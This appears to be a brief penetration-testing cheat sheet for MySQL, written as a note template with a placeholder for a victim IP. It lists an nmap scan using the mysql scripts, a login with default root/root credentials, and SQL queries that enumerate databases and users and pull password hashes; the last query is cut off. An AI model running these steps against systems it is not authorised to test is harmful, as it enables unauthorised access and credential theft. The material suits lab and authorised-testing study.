Find credential with other port and use default to login

```sh
nmap -sV -Pn -vv -script=mysql* <% tp.frontmatter["IPVictima"] %> -p 3306
```

```sh
mysql -u root -p 'root' -h <% tp.frontmatter["IPVictima"] %> -P 3306
```

```sql
select version(); | show databases;  | use databse | select * from users; | show tables |  select system_user(); | SELECT user, authentication_string FROM mysql.user WHERE user = Pre
```
